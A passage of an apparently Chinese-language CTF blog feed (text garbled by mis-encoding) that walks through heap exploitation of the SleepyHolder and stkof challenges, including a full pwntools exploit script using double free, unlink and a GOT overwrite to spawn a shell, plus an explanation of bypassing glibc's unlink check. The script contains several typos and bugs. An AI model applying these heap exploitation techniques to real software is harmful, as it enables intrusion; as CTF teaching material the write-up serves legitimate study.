href="#A-åˆ†æç¨‹åº" class="headerlink" title="A . åˆ†æç¨‹åº"></a>A . åˆ†æç¨‹åº</h3><p>â€‹                è¿è¡Œçœ‹çœ‹æ•ˆæœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Waking Sleepy Holder up ...</span><br><span class="line">Hey! Do you have any secret?</span><br><span class="line">I can help you to hold your secrets, and no one will be able to see it :)</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">1</span><br><span class="line">What secret do you want to keep?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">3. Keep a huge secret and lock it forever</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">AAAAAA</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">3</span><br><span class="line">Which Secret do you want to renew?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">Small</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">2</span><br><span class="line">Which Secret do you want to wipe?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>â€‹                çœ‹çœ‹ä¿æŠ¤å’Œæ–‡ä»¶æ ¼å¼ï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /><p>â€‹                ä¸»è¦å‡½æ•°å¦‚ä¸‹ï¼Œé™¤æ­¤ä¹‹å¤–æœ¬ç¨‹åºä¸­çš„alarm()ä¹Ÿéœ€è¦keypatchæ‰ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="  /><p>â€‹                åˆ†æä¸»è¦å‡½æ•°ï¼š</p><p>â€‹                Add():åªå…è®¸åˆ†é…small,big,hugeä¸‰ç§secretï¼Œæ¯ç§åªèƒ½åˆ†é…ä¸€æ¬¡ï¼Œè€Œä¸”hugeåªè¦åˆ†é…è¿‡åï¼Œå°±ä¸å†å…è®¸ä½¿ç”¨huge secretäº†ã€‚å¦å¤–ï¼Œè¿™ä¸‰ç§secretçš„æŒ‡é’ˆéƒ½ä½äºbssæ®µï¼Œæ˜¯å…¨å±€å˜é‡ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:87%;" /><p>â€‹                Wipe():free()æ—¶æœªæ£€æŸ¥æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œå­˜åœ¨Double freeæ¼æ´ã€‚</p><p>â€‹                Renew():è¾“å…¥é™åˆ¶å¤§å°ï¼Œä¸å¯å †æº¢å‡ºã€‚å› æ­¤æ„é€ å’Œè¾“å…¥payloadæ—¶éƒ½è¦æ ¹æ®secretå¤§å°æ¥é€‰æ‹©ã€‚</p><p>â€‹                å¦å¤–ç¨‹åºä¸­æ²¡æœ‰æ‰¾åˆ°è¾“å‡ºå‡½æ•°ï¼Œå¤§è‡´æ–¹å‘è¿˜æ˜¯ä¿®æ”¹gotè¡¨ï¼Œputs(func@plt)ï¼Œè®¡ç®—åç§»å¾—åˆ°libcï¼Œå†getshellã€‚</p><h3 id="B-å†…å­˜å¸ƒå±€"><a href="#B-å†…å­˜å¸ƒå±€" class="headerlink" title="B . å†…å­˜å¸ƒå±€"></a>B . å†…å­˜å¸ƒå±€</h3><ul><li><p>ç”³è¯·small chunkå’Œbig chunkï¼Œç„¶åé‡Šæ”¾small chunkã€‚</p></li><li><p>ç”³è¯·huge chunkï¼Œæ­¤æ—¶ç”±äºmalloc_consolidate()ï¼Œsmall chunkè¢«ä¸¢è¿›unsort binã€‚</p></li><li><p>å†é‡Šæ”¾small chunkï¼ŒåˆæŠŠsmall chunkä¸¢è¿›fast binã€‚double freeã€‚</p></li><li><p>small chunkæ„é€ fake_chunkï¼Œå¹¶ä¿®æ”¹big chunkçš„æ ‡å¿—ä½ï¼Œæ¬ºéª—ç³»ç»Ÿç›¸ä¿¡fake chunkå·²ç»freeï¼Œéœ€è¦åˆå¹¶ã€‚</p></li><li><p>æ­¤æ—¶é‡Šæ”¾big chunkï¼Œç³»ç»Ÿä¼šä½¿å…¶ä¸small_chunké‡Œé¢çš„fake_chunkåˆå¹¶ï¼Œå¯¼è‡´unlinkã€‚</p></li><li><p>æ­¤æ—¶å†™å…¥fake chunkä¸­çš„æŒ‡é’ˆæˆåŠŸåç§»ã€‚</p><h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C  . Leak &amp; Getshell"></a>C  . Leak &amp; Getshell</h3></li><li><p>é€šè¿‡small_ptræŠŠbig_ptrã€small_ptrå’Œ3ä¸ªæ ‡å¿—ä½åˆ†åˆ«æ”¹æˆatoi@pltï¼Œfree@gotï¼Œå’Œ1ã€‚</p></li><li><p>renew(1)å°†puts@gotå†™å…¥small_ptrï¼Œå…¶å®æ˜¯è¦†å†™äº†free@gotã€‚</p></li><li><p>free(2)ç›¸å½“äºputs(atoi@plt)ï¼Œé€šè¿‡è®¡ç®—å¯ä»¥é€å‡ºlibcåœ°å€å•¦ã€‚</p></li><li><p>ç°åœ¨æˆ‘ä»¬å·²ç»æˆåŠŸé€åˆ°äº†libcçš„åœ°å€ï¼Œé€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ°systemåœ°å€äº†ã€‚</p></li><li><p>renew(1)å°†system_addrå†™å…¥åˆ°small_ptrï¼Œå…¶å®ä¹Ÿæ˜¯è¦†å†™äº†free@gotã€‚</p></li><li><p>renew(2)å°†â€/bin/sh\x00â€å†™å…¥åˆ°big_ptrå¾…ç”¨ã€‚</p></li><li><p>ç°åœ¨åªè¦wipe(2)ï¼Œå®é™…ä¸Šå°±æ˜¯getshellå’¯(ã€‚ãƒ»âˆ€ãƒ»)ãƒã€‚</p><h4 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">small_ptr = <span class="number">0x06020D0</span></span><br><span class="line">free_addr = elf.got[free]</span><br><span class="line">puts_addr = elf.got[puts]</span><br><span class="line">puts_plt = elf.plt[puts]</span><br><span class="line">atoi_addr = elf.got[atoi]</span><br><span class="line">atoi_offset = libc.symbols[atoi]</span><br><span class="line">system_offset = libc.symbols[system]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntill(<span class="string">&quot;Tell me your secret:\n&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntill(<span class="string">&quot;2. Big secret\n&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span>(<span class="params">index,content</span>):</span></span><br><span class="line">p.recvuntill(<span class="string">&quot;3. Renew secret&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntill(<span class="string">&quot;2. Big secret&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntill(<span class="string">&quot;Tell me your secret:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=======================Memory Arrange=======================</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">wipe(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&quot;CCCCCCCCC&quot;</span>)<span class="comment">#triger malloc_consolidate()</span></span><br><span class="line">wipe(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">fake_chunk =p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment">#chunk header is useless</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x18</span>)<span class="comment">#unlink ptr</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x10</span>)<span class="comment">#unlink ptr too</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)<span class="comment">#made chunk2 believe that chunk1is free to triger unlink</span></span><br><span class="line">add(<span class="number">1</span>,fake_chunk)<span class="comment">#now we can move the small_ptr later</span></span><br><span class="line">wipe(<span class="number">2</span>)<span class="comment">#triger the unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#============================ Leak ===========================</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=atoi_addr<span class="comment">#big_chunk = atoi@got</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span><span class="comment">#the huge_ptr is useless anyway</span></span><br><span class="line">payload+=free_addr<span class="comment">#small_chunk = free@got</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)*<span class="number">3</span><span class="comment">#insure 3 flags == 1</span></span><br><span class="line">renew(<span class="number">1</span>,payload)<span class="comment">#change the chunk_ptr to got</span></span><br><span class="line">renew(<span class="number">1</span>,puts_plt)<span class="comment">#change free_addr to puts_plt</span></span><br><span class="line">wipe(<span class="number">2</span>)<span class="comment">#free(big_ptr) &lt;----&gt; puts(puts_plt)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=========================== GetShell ========================</span></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;/x00&#x27;</span>)) - atoi_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">renew(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">renew(<span class="number">2</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink(stkof)</title>
      <link href="2020/03/02/Unlink-stkof/"/>
      <url>2020/03/02/Unlink-stkof/</url>
      
        <content type="html"><![CDATA[<p>â€‹        å…³äºunlinkçš„ä»‹ç»å’Œå…¥é—¨ã€‚ã€‚ã€‚ã€‚<span id="more"></span></p><p>â€‹        unlinkä¹Ÿæ˜¯ä¸€ä¸ªçœ‹äº†å¥½ä¹…çœ‹ä¸æ‡‚çš„ä¸œè¥¿ï¼Œä»Šå¤©ç®—æ˜¯æ•´æ˜ç™½äº†ã€‚</p><h2 id="0x00-unlink-æ¼æ´"><a href="#0x00-unlink-æ¼æ´" class="headerlink" title="0x00 . unlink æ¼æ´"></a>0x00 . unlink æ¼æ´</h2><h3 id="A-unlinkåŸç†"><a href="#A-unlinkåŸç†" class="headerlink" title="A . unlinkåŸç†"></a>A . unlinkåŸç†</h3><p>â€‹        å‡è®¾æœ‰å¦‚ä¸‹chunk0ï¼Œchunk1ï¼Œå…¶ä¸­chunk0æ˜¯ä½¿ç”¨ä¸­çš„smallï¼Œchunk1æ˜¯å·²é‡Šæ”¾çš„small chunkï¼Œä¸¤è€…åœ¨å†…å­˜ä¸Šç›¸é‚»ã€‚</p><p>â€‹        ç”±äºchunk1å·²é‡Šæ”¾ï¼Œæ‰€ä»¥ä½äºsmall biné“¾è¡¨ä¸­ï¼Œåˆä¸chunk2ï¼Œchunk3åœ¨é“¾è¡¨ç»“æ„ä¸Šç›¸é‚»ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /><p>â€‹        æ­¤æ—¶å¦‚æœfree(chunk0)ï¼Œglibcæœºåˆ¶å°±ä¼šåˆ¤æ–­å‰å(å†…å­˜ä¸Š)æœ‰æ— ç›¸é‚»çš„å·²é‡Šæ”¾chunkï¼Œå¦‚æœæœ‰ï¼Œå°±å’Œchunk0ä¸€åŒåˆå¹¶æˆä¸€ä¸ªå¤§chunkã€‚è€Œä¸æ­¤åŒæ—¶ï¼Œè¿˜è¦æŠŠchunk1ä»small binä¸­â€œæ‹”å‡ºæ¥â€ï¼Œå…¶ä¸­å‘ç”Ÿçš„æ–­é“¾ï¼Œä¿®æ”¹é“¾è¡¨çš„æ“ä½œå°±æ˜¯unlinkã€‚æ¢è¨€ä¹‹unlinkå°±æ˜¯ä¸€ä¸ªä»åŒå‘é“¾è¡¨ä¸­æŠ½å‡ºä¸€ä¸ªchunkçš„æ“ä½œã€‚ï¼ˆphoto from ctf-wikiï¼‰</p><p>â€‹        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /></p><p>â€‹        æ‰€ä»¥unlinkåªé€‚ç”¨äºéfast chunkï¼Œå› ä¸ºfast chunkä¸å­˜åœ¨åŒå‘é“¾è¡¨ï¼ŒåŒæ—¶fast chunkä¹Ÿå¹¶ä¸æ˜¯ç”¨å®Œå°±é©¬ä¸Šå›æ”¶çš„ã€‚</p><h3 id="B-å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32-bitï¼‰"><a href="#B-å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32-bitï¼‰" class="headerlink" title="B . å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32 bitï¼‰"></a>B . å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32 bitï¼‰</h3><p>â€‹        é‚£ä¹ˆå¦‚ä½•é€šè¿‡unlinkè¾¾åˆ°ä»»æ„å†™çš„ç›®çš„å‘¢ï¼Ÿæ›¾ç»çš„unlinkåˆ©ç”¨æ˜¯è¿™æ ·çš„ï¼š</p><p>â€‹        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:55%;" /></p><p>â€‹        1.åœ¨è¿›è¡Œunlinkä¹‹å‰ä¿®æ”¹chunk0çš„fdå’Œbkï¼Œä½¿å¾—FD = target_addrï¼ŒBK = expect valueï¼ˆå¯ä»¥é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ¼æ´ä¿®æ”¹ï¼Œæˆ–è€…æ„é€ fake chunkï¼‰ã€‚</p><p>â€‹        2.è¿›è¡Œåˆå¹¶æ“ä½œï¼Œéœ€è¦å°†chunk1çš„å‰é©±åç»§çš„æŒ‡å‘ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆchunk0çš„å‰é©±åç»§ï¼Œä¹Ÿå°±æ˜¯å°†chunk1çš„FDå’ŒBKæ”¹æˆchunk0çš„FDå’ŒBKï¼Œåœ¨ä¸€èµ·æ€»è¦ä¸€æ¡å¿ƒå˜›ã€‚</p><p>â€‹        3.æ­¤æ—¶chunk1å·²ç»FDå†™å…¥äº†target_addrï¼ŒBKå†™å…¥äº†expect valueï¼Œåœ¨é‡Šæ”¾chunk0ï¼Œä½¿å¾—chunk1è¿›è¡Œunlinkã€‚</p><p>â€‹        4.chunk1çš„unlinkï¼Œå®é™…ä¸Šå°±æ˜¯ä¿®æ”¹small binä¸­çš„å‰é©±åç»§ï¼Œå°†å‰é©±çš„åç»§ï¼ˆåŸæœ¬æ˜¯chunk1ï¼‰æ”¹æˆè‡ªå·±çš„åç»§ï¼Œå°†åç»§çš„å‰é©±ï¼ˆåŸæœ¬æ˜¯chunk1ï¼‰æ”¹æˆè‡ªå·±çš„å‰é©±ã€‚è€Œç³»ç»Ÿæ˜¯æ€ä¹ˆä¿®æ”¹å‰é©±åç»§çš„å‘¢ï¼Œå°±æ˜¯ä¿®æ”¹FDæŒ‡é’ˆ + 8çš„åœ°å€ï¼ˆheap head å 8ä¸ªå­—èŠ‚ï¼Œç´§æ¥ç€å°±æ˜¯è¯¥chunkçš„fdæŒ‡é’ˆï¼‰å’Œä¿®æ”¹FDæŒ‡é’ˆ + 12çš„åœ°å€ï¼ˆheap headå 8 Bytesï¼Œfdå 4 Bytesï¼Œç´§æ¥ç€å°±æ˜¯è¯¥chunkçš„bkæŒ‡é’ˆï¼‰ã€‚</p><p>â€‹        5.æ‰€ä»¥ç³»ç»Ÿä¼šå°†chunk1çš„FDâ€“&gt;bkæ”¹æˆè‡ªå·±çš„BKï¼Œå°†BKâ€“&gt;fdæ”¹æˆè‡ªå·±çš„FDï¼Œæ¢å¥è¯è¯´å°±æ˜¯ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk=BK;<span class="comment">//target_addr - 12 + 12 = expect value;</span></span><br><span class="line">BK-&gt;fd=FD;<span class="comment">//expect value + 8 = target_addr;</span></span><br></pre></td></tr></table></figure><p>â€‹        è¿™æ ·å°±å®ç°äº†ä»»æ„å†™ã€‚</p><h3 id="C-å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨-ï¼ˆ64-bitï¼‰"><a href="#C-å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨-ï¼ˆ64-bitï¼‰" class="headerlink" title="C . å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨ ï¼ˆ64 bitï¼‰"></a>C . å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨ ï¼ˆ64 bitï¼‰</h3><p>â€‹        ä½†æ˜¯ç°åœ¨çš„glibcåŠ å¼ºäº†ä¿æŠ¤æœºåˆ¶ï¼Œå¢åŠ äº†ä»¥ä¸‹æ£€æŸ¥è¿‡ç¨‹ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>â€‹        ä¹Ÿå°±æ˜¯è¯´ï¼Œå¿…é¡»ä½¿å¾—chunk1å‰é©±çš„åç»§ï¼Œå’Œåç»§çš„å‰é©±éƒ½æŒ‡å‘åŒä¸€ä¸ªpã€‚è‡³äºpæ˜¯å•¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹å½“ç„¶æ˜¯chunk1å’¯ï¼Œä½†æ˜¯æ—¢ç„¶è¦æ¼æ´åˆ©ç”¨ï¼Œé‚£å½“ç„¶ä¸èƒ½é¡ºç€ç³»ç»Ÿæœºåˆ¶æ¥ã€‚</p><p>â€‹        æˆ‘ä»¬è¿›è¡Œå¦‚ä¸‹æ„é€ ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD = p - <span class="number">0x18</span>;</span><br><span class="line">chunk1-&gt;BK = p - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><p>â€‹        é‚£ä¹ˆç³»ç»Ÿæ£€æŸ¥æ—¶å°±ä¼šè¿›è¡Œå¦‚ä¸‹åˆ¤æ–­ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk == chunk1-&gt;BK-&gt;fd ;<span class="comment">//bingo!! </span></span><br><span class="line">p - <span class="number">0x18</span> + <span class="number">0x18</span> == p - <span class="number">0x10</span> +<span class="number">0x10</span>; <span class="comment">// We pass!!</span></span><br></pre></td></tr></table></figure><p>â€‹        æ—¢ç„¶æ£€æŸ¥è¿‡äº†ï¼Œå°±è¿›è¡Œunlinkå§ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk = chunk1-&gt;BK;<span class="comment">//p - 0x18 + 0x18 = p - 0x10</span></span><br><span class="line">chunk1-&gt;BK-&gt;fd = chunk1-&gt;FD;<span class="comment">//p - 0x10 + 0x10 = p - 0x18</span></span><br></pre></td></tr></table></figure><p>â€‹        ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æŠŠpæŒ‡é’ˆå‘å‰åç§»äº†0x18ã€‚è™½ç„¶ä¸ç®—æ˜¯ä»»æ„å†™ï¼Œä½†ä¹Ÿè¶³å¤Ÿåˆ©ç”¨äº†ã€‚</p><h2 id="0x01-stkof-writeup"><a href="#0x01-stkof-writeup" class="headerlink" title="0x01 . stkof writeup"></a>0x01 . stkof writeup</h2><h3 id="A-ç¨‹åºåˆ†æ"><a href="#A-ç¨‹åºåˆ†æ" class="headerlink" title="A . ç¨‹åºåˆ†æ"></a>A . ç¨‹åºåˆ†æ</h3><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:40%;" /><p>â€‹        useless()çš„åŠŸèƒ½å¤§æ¦‚æ˜¯ç”¨æ¥æµ‹è¯•ç”¨æˆ·è¾“å‡ºçš„chunkåºå·æ˜¯å¦å·²åˆ†é…ï¼Œä»…æ­¤è€Œå·²ã€‚åœ¨ä¸»å‡½æ•°é‡Œæ²¡æœ‰æ‰¾åˆ°å¯ä»¥è¾“å‡ºçš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘è¦†å†™gotè¡¨æ¥leak libcã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        è‡³äºå…¶ä»–å‡½æ•°ï¼š</p><ul><li><p>add()æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ã€‚</p></li><li><p>delete()ä¸­free()åæœªå°†æŒ‡é’ˆç½®ç©º</p></li><li><p>fill()ä¸­å†è®©ç”¨æˆ·è¾“å…¥ä¸€ésizeï¼Œä¸åŒäºadd()ä¸­çš„sizeï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚    </p></li></ul><p>â€‹        åœ¨æœ¬ç¨‹åºçš„å‡ 